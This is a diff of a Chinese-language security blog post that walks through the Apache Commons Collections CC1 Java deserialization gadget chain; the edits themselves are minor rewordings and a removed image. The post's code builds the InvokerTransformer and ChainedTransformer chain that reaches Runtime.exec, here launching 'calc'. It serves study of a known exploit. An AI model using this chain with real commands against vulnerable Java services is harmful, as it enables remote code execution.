@@ -35,7 +35,6 @@
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250415111534344.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250415143721033.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250415143912674.png">
-<meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250416092615711.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250416094042779.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250416094159980.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250417114316398.png">
@@ -44,7 +43,7 @@
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250416205704812.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250416211332023.png">
 <meta property="article:published_time" content="2025-04-17T06:52:47.000Z">
-<meta property="article:modified_time" content="2025-04-17T07:22:07.748Z">
+<meta property="article:modified_time" content="2025-04-17T07:34:09.460Z">
 <meta property="article:author" content="bxhhf">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://bxhhf.github.io/2025/04/17/CC1/image-20250415193650264.png">
@@ -404,7 +403,10 @@
 
 
 
-<p><img src="/2025/04/17/CC1/image-20250416092615711.png" srcset="/img/loading.gif" lazyload alt="image-20250416092615711"></p>
+
+
+
+
 <h3 id="阶段三分析"><a href="#阶段三分析" class="headerlink" title="阶段三分析"></a>阶段三分析</h3><blockquote>
 <p>readObject里面调setValue</p>
 </blockquote>
@@ -435,14 +437,15 @@
 
 
 
-<p>但迭代器 <code>TransformedEntryIterator</code> 在遍历原始 <code>Map.Entry</code> 时，会将每个原始条目包装为 <code>TransformedMapEntry</code>，并 **显式传入当前 <code>TransformedMap</code> 实例作为 <code>parent</code>**：</p>
+<p>但迭代器 <code>TransformedEntryIterator</code> 在遍历原始 <code>Map.Entry</code> 时，会将每个原始条目包装为 <code>TransformedMapEntry</code>，并 **显式传入当前 <code>TransformedMap</code> 实例作为 <code>parent</code>**：(在TransformedEntryIterator的next中赋值，使其 <code>parent</code> 指向了 <code>transformedMap</code>。）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedEntryIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Iterator iterator;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformedEntryIterator</span><span class="hljs-params">(Iterator iterator)</span> &#123;<br>        <span class="hljs-built_in">this</span>.iterator = iterator;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 获取原始 Entry，并包装为 TransformedMapEntry</span><br>        Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) iterator.next();<br>        <span class="hljs-comment">// 关键点：将当前 TransformedMap 实例（this）作为 parent 传入</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMapEntry</span>(entry, TransformedMap.<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>   <br>&#125;<br></code></pre></td></tr></table></figure>
 
 
 
 
 
-<p>在TransformedEntryIterator的next中赋值，使其 <code>parent</code> 指向了 <code>transformedMap</code>。</p>
+
+
 <p>所以</p>
 <p>遍历 **<code>entrySet()</code>   返回包装后的 <code>TransformedMapEntry</code>    **   每个 <code>TransformedMapEntry</code> 持有 <code>parent</code></p>
 <p>当调用 TransformedMapEntry.setValue 时，会通过 parent.checkSetValue 调用的 TransformedMap.checkSetValue  </p>
@@ -462,11 +465,11 @@
 <ul>
 <li>这里犯了一个错误，直接想new 的时候传getRuntime,这肯定是不行的,这样transform()里面的参数就得是Runtime实例化对象，那不就还是回到这个问题，就还没解决这个问题嘛</li>
 </ul>
-<p>奥所以这儿就是利用这个危险方法transform先调getMethod,再调invoke,反射得到实例化对象再</p>
+<p>所以这儿就是利用这个危险方法transform先调getMethod,再调invoke,反射得到实例化对象再调exec</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime1</span> <span class="hljs-operator">=</span> (Method)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><span class="hljs-comment">//相当于Method getRuntime = Runtime.class.getMethod(&quot;getRuntime&quot;, null);</span><br><br>Runtime r= (Runtime)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntime1);<br><span class="hljs-comment">//相当于Runtime r= (Runtime)getRuntime.invoke(null, null);</span><br><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><span class="hljs-comment">//相当于</span><br><span class="hljs-comment">//Method exec = Runtime.class.getMethod(&quot;exec&quot;, String.class)</span><br><span class="hljs-comment">//exec.invoke(r, &quot;calc&quot;);</span><br></code></pre></td></tr></table></figure>
 
 <p>观察上面的发现，它是循环调用了transform方法，下一个调上一个返回的结果</p>
-<p>ChainedTransformer类中的transformer就能实现这个功能，构造器里面传数组Transformer它来调transform</p>
+<p>ChainedTransformer类中的transformer就能实现这个功能，构造器里面传数组Transformer它来调transform()</p>
 <p><img src="/2025/04/17/CC1/image-20250416193209756.png" srcset="/img/loading.gif" lazyload alt="image-20250416193209756"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>      &#125;;<br>      <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>      chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure>
 
